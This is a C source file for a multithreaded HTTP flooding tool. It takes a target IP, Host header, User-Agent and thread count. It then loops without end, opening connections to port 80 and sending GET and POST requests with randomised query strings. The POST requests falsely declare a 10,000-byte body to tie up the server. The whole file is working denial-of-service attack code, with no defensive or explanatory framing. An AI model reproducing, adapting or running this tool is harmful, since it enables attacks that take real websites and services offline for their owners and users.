#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>

int sizeread;
char *tgtip;
char *useragent;
char *hosthdr;
struct timeval tv;
struct sockaddr_in sa; 

char *make_post() {
 int a = rand() % (32 - 0) + 0;
 char *randem = malloc(a);
 memset(randem, 0, a);
 for(int i = 0; i < a; i++) {
  randem[i] = rand() % (0x7b - 0x61) + 0x61;
 }
 char *req = malloc(1024);
 sprintf(req, "POST /?q=%s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: keep-alive\r\nAccept: */*\r\nAccept-Encoding: gzip\r\nContent-Length: 10000\r\n\r\n", randem, hosthdr, useragent);
 free(randem);
 return req;
}

char *make_get() {
 int a = rand() % (32 - 0) + 0;
 char *randem = malloc(a);
 memset(randem, 0, a);
 for(int i = 0; i < a; i++) {
  randem[i] = rand() % (0x7b - 0x61) + 0x61;
 }
 char *req = malloc(1024);
 sprintf(req, "GET /?q=%s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: close\r\nAccept: */*\r\nAccept-Encoding: gzip\r\n\r\n", randem, hosthdr, useragent);
 free(randem);
 return req;
}

int makesa() {
 sa.sin_addr.s_addr = inet_addr(tgtip);
 sa.sin_port = htons(80); 
 sa.sin_family = AF_INET;
}

void *dosg(void *unused) {
 int fd = socket(AF_INET, SOCK_STREAM, 0); 
 setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
 setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
 char *req = make_get();
 if(connect(fd, (struct sockaddr *)&sa, sizeof(sa)) != -1) {
  send(fd, req, strlen(req), MSG_NOSIGNAL); 
 }
 free(req);
 close(fd);
}

void *dosp(void *unused) {
 int fd = socket(AF_INET, SOCK_STREAM, 0); 
 setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
 setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
 char *req = make_post();
 if(connect(fd, (struct sockaddr *)&sa, sizeof(sa)) != -1) {
  send(fd, req, strlen(req), MSG_NOSIGNAL);
 }
 free(req);
 close(fd);
}

int make_threads(int threadnum) {
 pthread_t threadg[threadnum];
 pthread_t threadp[threadnum]; 
 makesa();
 while(1) {
  for(int i = 0; i < threadnum; i++) {
   pthread_create(&threadg[i], 0, &dosg, 0);
   pthread_create(&threadp[i], 0, &dosp, 0);
  }
  for(int i = 0; i < threadnum; i++) {
   pthread_join(threadg[i], 0);
   pthread_join(threadp[i], 0);
   dprintf(1, "sent %d requests\n", threadnum * 2);
  }
 } 
}

int main(int argc, char **argv) {
 tv.tv_sec = 1;
 srand(time(0));
 if(argc < 5) {
  dprintf(1, "ip host-header user-agent threads\n");
  return 0;
 }
 tgtip = argv[1];
 hosthdr = argv[2];
 useragent = argv[3];
 make_threads(atoi(argv[4]));
}
